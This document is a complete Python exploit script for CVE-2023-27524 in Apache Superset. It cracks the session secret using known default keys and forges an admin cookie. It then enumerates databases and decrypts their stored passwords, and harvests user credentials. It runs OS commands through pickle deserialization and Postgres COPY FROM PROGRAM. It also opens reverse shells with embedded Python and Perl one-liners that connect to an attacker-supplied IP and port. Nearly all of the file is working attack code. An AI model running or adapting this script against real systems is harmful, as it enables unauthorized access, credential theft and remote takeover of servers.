# @jakabakos
# Exploit script for CVE-2023-27524
# Tested with Apache Superset v2.0.1
# Based on https://github.com/horizon3ai/CVE-2023-27524

import os
import re
import sys
import json
import socket
import pickle
import base64
import urllib3
import requests
import argparse
import traceback
from time import sleep
from binascii import hexlify
from packaging import version
from tabulate import tabulate
from flask_unsign import session
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import algorithms, Cipher, modes

# Disable InsecureRequestWarning from urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Constants
SLEEP_TIME_BEFORE_LOGIN_ATTEMPT = 3
PERMALINK_STORE_MAX_RETRIES = 30
PERMALINK_SLEEP_TIME_BEFORE_CREATING = 5
QUERY_SELECT_VERSION = 'SELECT version();'
QUERY_HARVEST_CREDS = 'select username,password from ab_user;'
QUERY_DB_CONN_INFOS = 'select database_name,sqlalchemy_uri,password from dbs;'
DEAULT_SECRET_KEYS = [
    b'\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h',  # version < 1.4.1
    b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',          # version >= 1.4.1
    b'thisISaSECRET_1234',                            # deployment template
    b'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',          # documentation
    b'TEST_NON_DEV_SECRET'                            # docker compose
]

# Function to decrypt a password
def decrypt_password(key, encrypted_password):
    encrypted_password = str(encrypted_password)
    try:
        # Generate a key using SHA-256 from the provided key
        sha2_digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
        sha2_digest.update(key)
        key = sha2_digest.finalize()

        # Initialize the IV with the first 16 bytes of the key
        iv = key[:16]

        # Decode the base64-encoded encrypted value
        encrypted = base64.b64decode(encrypted_password.encode())

        # Create a cipher using AES in CBC mode
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

        # Create a decryptor and decrypt the data
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(encrypted) + decryptor.finalize()

        # Remove trailing null bytes and print the decrypted result
        decrypted = decrypted.rstrip(b'\x00')
        return decrypted.decode()
    except Exception as e:
        log(f'Unexpected error while decrypting password: {str(e)}', success=False)

# Function to validate an IP address
def is_valid_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except socket.error:
        return False

# Function to validate a port number
def is_valid_port(port):
    try:
        port = int(port)
        return 1 <= port <= 65535
    except ValueError:
        return False

# Function to validate the --revshell argument
def validate_revshell_arg(args_value):
    revshell_args = args_value.split(':')
    if len(revshell_args) != 2:
        raise argparse.ArgumentTypeError("Invalid format for --revshell argument. Use IP:Port format.")
    else:
        ip, port = revshell_args
        if not is_valid_ip(ip):
            raise argparse.ArgumentTypeError(f"Invalid IP address: {ip}")
        if not is_valid_port(port):
            raise argparse.ArgumentTypeError(f"Invalid port: {port}")
        return args_value

# Function to read secret keys from a file
def read_secret_keys_from_file(filename):
    with open(filename, 'rb') as file:
        return [line.strip() for line in file]

# Function to log messages with a success flag
def log(message, success=True):
    prefix = "[+]" if success else "[-]"
    print(f"{prefix} {message}")

# Function to get the session cookie from a URL
def get_session_cookie(url):
    resp = requests.get(url + '/login/', verify=False, timeout=30, allow_redirects=False)
    if resp.status_code != 200:
        log(f'Error retrieving login page at {url}, status code: {resp.status_code}.', success=False)
        sys.exit(1)
    session_cookie = None
    for c in resp.cookies:
        if c.name == 'session':
            session_cookie = c.value
            break
    if not session_cookie:
        log('Error: No session cookie found.', success=False)
    else:
        log(f'Session cookie found.')
    return session_cookie

# Function to decode a Flask session cookie
def decode_session_cookie(session_cookie):
    try:
        decoded = session.decode(session_cookie)
        log(f'Decoded session cookie:\n    {decoded}')
        return decoded
    except:
        log('Error: Not a Flask session cookie.', success=False)
        sys.exit(1)

# Function to validate the Superset version
def validate_superset_version(url, session_cookie):
    superset_version = get_superset_version(url, session_cookie)
    if superset_version == 'unknown':
        log("Superset version can not be identified.")
        return
    if version.parse(superset_version) <= version.parse("2.1.0"):
        log(f"Version {superset_version} seems vulnerable.")
    else:
        log(f"Version {superset_version} seems NOT to be vulnerable.", success=False)

# Function to get the Superset version
def get_superset_version(url, session_cookie):
    headers = {'Cookie': f'session={session_cookie}'}
    resp = requests.get(url + '/login/', verify=False, headers=headers, timeout=30, allow_redirects=False)
    match = re.search(r'&#34;version_string&#34;: &#34;(.*?)&#34', resp.text)
    version = match.group(1) if match else 'unknown'
    return version


def crack_session_cookie(session_cookie, secret_keys):
    if not secret_keys:
        secret_keys = DEAULT_SECRET_KEYS
        log("Using default secret keys.")
    elif os.path.exists(secret_keys):
        log(f"Using '{secret_keys}' as a wordlist.")
        secret_keys = read_secret_keys_from_file(secret_keys)
    else:
        log(f"The file '{secret_keys}' does not exist.", success=False)
    for i, SECRET_KEY in enumerate(secret_keys):
        cracked = session.verify(session_cookie, SECRET_KEY)
        if cracked:
            log('Superset instance is VULNERABLE to CVE-2023-27524.')
            log(f'Secret key found: "{SECRET_KEY}"')
            return SECRET_KEY
    log('Failed to crack session cookie.', success=False)
    sys.exit(1)

# Function to forge a session cookie for a user
def forge_session_cookie(user_id, SECRET_KEY):
    try:
        user_id = int(user_id)
    except:
        pass
    forged_cookie = session.sign({'_user_id': user_id, 'user_id': user_id}, SECRET_KEY)
    headers = {'Cookie': f'session={forged_cookie}'}
    log(f'Forged session cookie for user {user_id}:\n    {forged_cookie}')
    return headers

# Function to get headers for SQLLab
def get_query_headers(url, headers):
    response = requests.get(url + "/superset/sqllab/", headers=headers, verify=False, timeout=30, allow_redirects=False)

    set_cookie_header = response.headers.get('Set-Cookie')

    # Use regular expression to find the CSRF token from the response HTML
    pattern = r'<input(?:\s+(?:(?:type|name|id)\s*=\s*"[^"]*"\s*)+)?\s+value="([^"]+)"'
    csrf_token = re.search(pattern, response.text)
    
    # Check if CSRF token is found in the response and return the session cookie and the token
    if csrf_token:
        #log(f"CSRF token found:\n    {csrf_token.group(1)}")
        return set_cookie_header, csrf_token.group(1)
    else:
        # If CSRF token is not found, print an error message and exit the script
        log("[-] CSRF token not found. Exiting...", success=False)
        sys.exit(1)

# Function to validate vulnerability by attempting login
def validate_vulnerability(url, headers):
    try:
        # Flask session cookies are maybe signed with a timestamp element.
        sleep(SLEEP_TIME_BEFORE_LOGIN_ATTEMPT)
        resp = requests.get(url + '/login/', headers=headers, verify=False, timeout=30, allow_redirects=False)
        if resp.status_code == 302:
            log(f'Login successful. Vulnerability is validated.')
        else:
            log(f'Got status code {resp.status_code} when trying to login. Forged cookie does not appear to be valid. Re-check user id.', success=False)
    except Exception as e:
        log(f'Got error {e} on login. Forged cookie does not appear to be valid.', success=False)

# Function to enumerate databases via the API
def enumerate_databases(url, headers):
    log('Enumerating databases via API...')
    for i in range(1, 101):
        database_url_base = url.rstrip('/') + '/api/v1/database'
        try:
            r = requests.get(f'{database_url_base}/{i}', headers=headers, verify=False, timeout=30, allow_redirects=False)

            if r.status_code == 200:
                result = r.json()['result']
                name = result['database_name']
                try: 
                    password = result['parameters']['password']
                    log(f'Found database: "{name}" with password "{password}".')
                except KeyError as e:
                    log(f'Found database: "{name}".')
            
        except Exception as e_inner:
            log(f'Unexpected error while enumerating databases. Status code={r.status_code}.', success=False)
            break

# Function to enumerate database connection data and crack passwords if possible
def enum_db_conn_data(url, headers, secret_key):
    log('Enumerating database connection data and cracking password if possible...')
    db_connection_data = run_sql_command(url, headers, QUERY_DB_CONN_INFOS)

    for item in db_connection_data:
        # Check if the 'password' field is not None
        if item['password'] is not None:
            # Decode the base64-encoded password
            decoded_password = decrypt_password(secret_key, item['password'])
            # Add a new 'decrypted_password' field with the same value
            item['decrypted_password'] = decoded_password

    data_list = [item.values() for item in db_connection_data]
    headers = db_connection_data[0].keys()
    print(tabulate(data_list, headers=headers, tablefmt="psql"))

# Function to enumerate Superset users
def enumerate_users(url, headers):
    log('Trying to enumerate Superset users...')
    result = run_sql_command(url, headers, QUERY_HARVEST_CREDS)
    if result is not None and result != "":
        log("RESULT:")
        data_list = [item.values() for item in result]
        headers = result[0].keys()
        print(tabulate(data_list, headers=headers, tablefmt="psql"))
    else:
        log("Can't enumerate Superset users. Exiting...")
        sys.exit(1)

# Function to get headers for SQLLab requests
def get_headers_for_sqllab(url, headers):
    session_cookie, csrf_token = get_query_headers(url, headers)
    headers = {
        'X-CSRFToken': csrf_token,
        'Content-Type': 'application/json',
        'Cookie': f'{session_cookie}'
    }
    return headers

# Function to run a SQL command
def run_sql_command(url, headers, sql_cmd, database_id=1):
    headers = get_headers_for_sqllab(url, headers)
    data = {
        "database_id":database_id,
        "sql":sql_cmd,
        "expand_data":True
    }
    response = requests.post(url + "/superset/sql_json/", json=data, headers=headers, verify=False, timeout=30, allow_redirects=False)
    try:
        query_result = json.loads(response.text)['data']
        if len(query_result) > 0:
            return query_result
    except KeyError as e:
        log(f"No result received from the backend when running the SQL query.", success=False)
        return ""
    except Exception as e:
        log(f"An unexpected error occurred: {e}", success=False)
        return None
    return None

# Function to run an OS command
def run_os_command(url, headers, cmd):
    RUN_CUSTOM_OS_CMD=f"DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM '{cmd}';SELECT * FROM cmd_exec;"

    headers = get_headers_for_sqllab(url, headers)
    data = {
        "database_id":1,
        "sql":RUN_CUSTOM_OS_CMD,
        "expand_data":True
    }

    response = requests.post(url + "/superset/sql_json/", json=data, headers=headers, verify=False, timeout=30, allow_redirects=False)
    try:
        query_result = json.loads(response.text)
        if len(query_result) > 0:
            query_result = query_result['data']
            data_list = [item.values() for item in query_result]
            headers = query_result[0].keys()
            log(f"$ {cmd}")
            print(tabulate(data_list, headers=headers, tablefmt="psql"))
    except KeyError as e:
        if len(query_result) > 0:
            try:
                errors = json.dumps(query_result['errors'], indent=4)
                log(f"Error got from the backend.\n   {errors}")
            except KeyError as e:
                log(f"No output generated from the response.", success=False)
    except Exception as e:
        log(f"An unexpected error occurred: {e}", success=False)

# Function to store a new permalink
def store_new_permalink(url, headers):
    log("Trying to create a permalink. May take some time...")
    sleep(PERMALINK_SLEEP_TIME_BEFORE_CREATING)
    data = {"filterState":{},"urlParams":[],"hash":"CHART-rkgF4G4A4X"}
    headers = get_headers_for_sqllab(url, headers)

    for retry_count in range(PERMALINK_STORE_MAX_RETRIES):
        response = requests.post(url + f'/api/v1/dashboard/1/permalink', json=data, headers=headers, verify=False, timeout=30, allow_redirects=False)

        if response.status_code == 201:
            resp = json.loads(response.text)
            permalink_url = resp['url'].replace('None', url)
            log(f"Permalink created successfully:\n    {permalink_url}")
            return permalink_url
        else:
            sleep(2)
    
    log(f"Can't create permalink. Status code: {response.status_code}.", success=False)
    sys.exit(1)

# Function to expose a database in SQLLab
def expose_database_in_sqllab(url, headers, id):
    data = {
        "allow_ctas": True,
        "allow_cvas": True,
        "allow_dml": True,
        "allow_file_upload": False,
        "allow_multi_schema_metadata_fetch": True,
        "extra": "{\"allows_virtual_table_explore\":true,\"metadata_params\":{},\"engine_params\":{},\"metadata_cache_timeout\":{},\"schemas_allowed_for_file_upload\":[],\"cost_estimate_enabled\":true}"
    }
    
    headers = get_headers_for_sqllab(url, headers)
    response = requests.put(url + f'/api/v1/database/{id}', json=data, headers=headers, verify=False, timeout=30, allow_redirects=False)
    if response.status_code == 200:
        log(f"Settings of database with id {id} were successfully modified.")
        return True
    else:
        log(f"Request to expose the database with id {id} failed with status code {response.status_code}.", success=False)
        return False

# Function open a reverse shell
def run_revshell_cmd(URL, headers, ip, port):
    REVSHELL_CMD=f"""perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''"""
    run_os_command(URL, headers, REVSHELL_CMD)

# Function create a new permalink
def trigger_payload_through_permalink(permalink_url, headers):
    try:
        response = requests.get(permalink_url, headers=headers, verify=False, timeout=30, allow_redirects=False)
        log("Payload is triggered via permalink.")
        return True
    except Exception as e:
        log("Can't trigger payload.", success=False)
    return False

# Function obtaion superset metadata db conn
def get_superset_metadata_connection(url, headers):
    log("Checking existing metadata database connection...")
    for i in range(1, 101):
        database_url_base = url.rstrip('/') + '/api/v1/database'
        try:
            r = requests.get(f'{database_url_base}/{i}', headers=headers, verify=False, timeout=30, allow_redirects=False)
            if r.status_code == 200:
                result = r.json()['result']
                id = result['id']
                expose_database_in_sqllab(url,headers,id)
                if result['sqlalchemy_uri'] == "sqlite+pysqlite:////app/superset_home/superset.db":
                    log(f"Superset metadata connection is already added with id {id}.")
                    return id
                    
        except Exception as e:
            log(f'Unexpected error while trying to find Superset Metadata database. Status code: {r.status_code}.', success=False)
            return None
    log("Can't find existing metadata database connection, so trying to create one.", success=False)
    return None

# Function connect to metadata db
def connect_to_superset_metadata_database(url, headers):
    log("Connecting to Superset metadata database...")
    
    # Method 1 - Connect to Metadata Database with SQLite via URL bypass
    log("Trying to connect to the default SQLite metadata database with full SQLAlchemy URI...")
 
    data = {
        "database_name":"SQLite",
        "engine":"sqlite",
        "configuration_method":"sqlalchemy_form",
        "catalog":[{"name":"","value":""}],
        "sqlalchemy_uri":"sqlite+pysqlite:////app/superset_home/superset.db"
    }
    
    headers = get_headers_for_sqllab(url, headers)
    response = requests.post(url + '/api/v1/database/', json=data, headers=headers, verify=False, timeout=30, allow_redirects=False)
    if response.status_code == 201:
        id = json.loads(response.text)['id']
        log(f"Successfully connected to Superset Metadata SQLlite database with id {id}.")
        expose_database_in_sqllab(url,headers,id)
        return id
    else:
        log(f"Can't connect to the default Superset metadata database. Status code: {response.status_code}. Trying with other method.", success=False)
    
    # Method 2 - Connect to Metadata Database with Postgres and default creds
    log("Trying to connect to metadata database with default credentials.")
    headers = get_headers_for_sqllab(url, headers)
    data = {"database_name":"PostgreSQL","engine":"postgresql","configuration_method":"dynamic_form","catalog":[{"name":"","value":""}],"parameters":{"host":"db","port":"5432","database":"superset","username":"superset","password":"superset"},"encrypted_extra":"{}"}
    response = requests.post(url + '/api/v1/database/', json=data, headers=headers, verify=False, timeout=30, allow_redirects=False)
    if response.status_code == 201:
        id = json.loads(response.text)['id']
        log(f"Successfully connected to Superset Metadata SQLlite database with database id {id}.")
        expose_database_in_sqllab(url, headers, id)
        return id
    else:        
        log(f"Request of connection to Superset Metadata database is failed with status code: {response.status_code}. Exiting...", success=False)
        sys.exit(1)

# Generating Pickle payload with an OS command
def get_pickle_payload_os_cmd(cmd):
    log("Generating Pickle payload...")
    COMMAND=f"bash -c '{cmd}'"
    
    class PickleRCE:
        def __reduce__(self):
            return os.system, (COMMAND, )

    payload = pickle.dumps(PickleRCE(), protocol=0)
    payload = hexlify(payload).decode()
    log("Pickle payload generated successfully.")
    return payload

# Generating Pickle payload with a rev shell payload
def get_pickle_payload(ip, port):
    log("Generating Pickle payload...")
    COMMAND=f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"""

    class PickleRCE:
        def __reduce__(self):
            return os.system, (COMMAND, )

    payload = pickle.dumps(PickleRCE(), protocol=0)
    payload = hexlify(payload).decode()
    log("Pickle payload generated successfully.")
    return payload

# Put pickle payload into the db
def send_pickle_payload(url, headers, payload):
    log("Sending Pickle payload with Superset SQLlab. Using Postgres syntax.")
    QUERY_PICKLE_PAYLOAD_SQLITE   = f"update key_value set value=X'{payload}';"
    QUERY_PICKLE_PAYLOAD_POSTGRES = f"update key_value set value='\\x{payload}';"
    result = run_sql_command(url, headers, QUERY_PICKLE_PAYLOAD_POSTGRES, 1)
    return result

# Put os command payload into the db
def send_cmd_payload(url, headers, payload):
    log("Try to run OS command...")
    COMMAND=f"""python -c 'import subprocess;result=subprocess.run("{payload}",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True);print(result.stdout+"\n"+result.stderr);'"""
    result = run_sql_command(url, headers, COMMAND, 1)
    return result

# Obtain dbms metadata for validation
def get_dmbs_metadata(url, headers):
    result = run_sql_command(url, headers, QUERY_SELECT_VERSION)[0]['version'].split(' ')
    return result

# Verifying postgres version
def verify_postgres_version(url, headers):
    dbms_metadata = get_dmbs_metadata(url, headers)
    if dbms_metadata is None:
        log("Can't identify DBMS.", success=False)
        return False
    else:
        db_type = dbms_metadata[0].lower()
        db_version = dbms_metadata[1]

        MAX_VERSION='14.0'
        MIN_VERSION='9.3'
        if 'postgres' in db_type:
            if (version.parse(db_version) <= version.parse(MAX_VERSION) and \
                version.parse(db_version) >= version.parse(MIN_VERSION)):
                    return True
        return False
    
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', '-u', help='Host URL', required=True)
    parser.add_argument('--id', help='User ID to forge session cookie for. Default=1', required=False, default='1')
    parser.add_argument('--wordlist', '-w', help='Specify a wordlist file (default is 10.txt)', required=False, default=False)
    parser.add_argument('--validate', '-v', help='Validate the presence of vulnerability by login attempt', required=False, action='store_true')
    parser.add_argument('--enum-dbs', '-dbs', help='Enumerate databases', required=False, action='store_true', default=False)
    parser.add_argument('--enum-users', '-eu', help='Enumerate databases', required=False, action='store_true', default=False)
    parser.add_argument('--cmd', '-c', help='Run custom OS command on the database\'s server.', required=False)
    parser.add_argument("--revshell", help="Specify IP:Port for reverse shell", type=validate_revshell_arg)
    parser.add_argument("--db-host", help="Run commands or open reverse shell on the database server", action='store_true', default=False)
    args = parser.parse_args()

    if args.revshell and args.cmd:
        log("Error: Both --revshell and --cmd cannot be used simultaneously.", success=False)
        sys.exit(1)

    URL = args.url.rstrip('/') 

    try:
        session_cookie = get_session_cookie(URL)
        decoded_cookie = decode_session_cookie(session_cookie)
        secret_key = crack_session_cookie(session_cookie, args.wordlist)
        headers = forge_session_cookie(args.id, secret_key)

        validate_superset_version(URL, session_cookie)

        if args.validate:
            validate_vulnerability(URL, headers)

        if args.enum_dbs:
            enumerate_databases(URL, headers)
            enum_db_conn_data(URL, headers, secret_key)
            log(f'Process of enumerating databases finished.')

        if args.enum_users:
            # CVE-2023-39265 affects Superset versions <= 2.1.0.
            superset_metadata_id = get_superset_metadata_connection(URL, headers) or connect_to_superset_metadata_database(URL, headers)
            enumerate_users(URL, headers)
      
        elif args.cmd:
            # Run command on the Superset server
            if not args.db_host:
                log("Trying to run os command on Superset server...")
                superset_metadata_id = get_superset_metadata_connection(URL, headers) or connect_to_superset_metadata_database(URL, headers)
                permalink_url = store_new_permalink(URL, headers)
                payload = get_pickle_payload_os_cmd(args.cmd)
                result = send_pickle_payload(URL, headers, payload)

                #result = send_cmd_payload(URL, headers, payload)
                if trigger_payload_through_permalink(permalink_url, headers):
                    log("Command is executed successfully.")
            
            # Run command on the database server
            elif args.db_host:
                log("Trying to run command on the database server...")
                dbms_metadata = run_sql_command(URL, headers, QUERY_SELECT_VERSION)[0]['version'].split(' ')
                
                # Works with Postgres v9.3 - 14.0 only
                if dbms_metadata is not None:
                    db_type = dbms_metadata[0].lower()
                    db_version = dbms_metadata[1]
                    if 'postgres' in db_type and (version.parse(db_version) <= version.parse('14.0') and version.parse(db_version) >= version.parse('9.3')):
                        expose_database_in_sqllab(URL, headers, 1)
                        run_os_command(URL, headers, args.cmd)
                    else:
                        log(f"DBMS {db_version} version {db_version} is not supported for the exploit.", success=False)
                else:
                    log("Can't identify DBMS.", success=False)

        if args.revshell:
            ip, port = args.revshell.split(':')

            # Create reverse shell on Superset host
            if not args.db_host:
                # See CVE-2023-37941
                log("Trying to open reverse shell on Superset server...")
                superset_metadata_id = get_superset_metadata_connection(URL, headers) or connect_to_superset_metadata_database(URL, headers)
                permalink_url = store_new_permalink(URL, headers)
                payload = get_pickle_payload(ip, port)
                result = send_pickle_payload(URL, headers, payload)
                if trigger_payload_through_permalink(permalink_url, headers):
                    log("Check your reverse shell payload.")
                else:
                    log("Can't trigger reverse shell. Exiting...", success=False)
                    sys.exit(1)

            # Create reverse shell on db host
            elif args.db_host:
                log("Trying to open reverse shell on the database server...")
                if verify_postgres_version(URL, headers):
                    expose_database_in_sqllab(URL, headers, 1)
                    run_revshell_cmd(URL, headers, ip, port)
                else:
                    log(f"DBMS {db_version} version {db_version} is not supported for the exploit.", success=False)
                    sys.exit(1)

    except Exception as e:
        print(traceback.format_exc())
        log(f'Unexpected error: {e}', success=False)


if __name__ == '__main__':
    main()
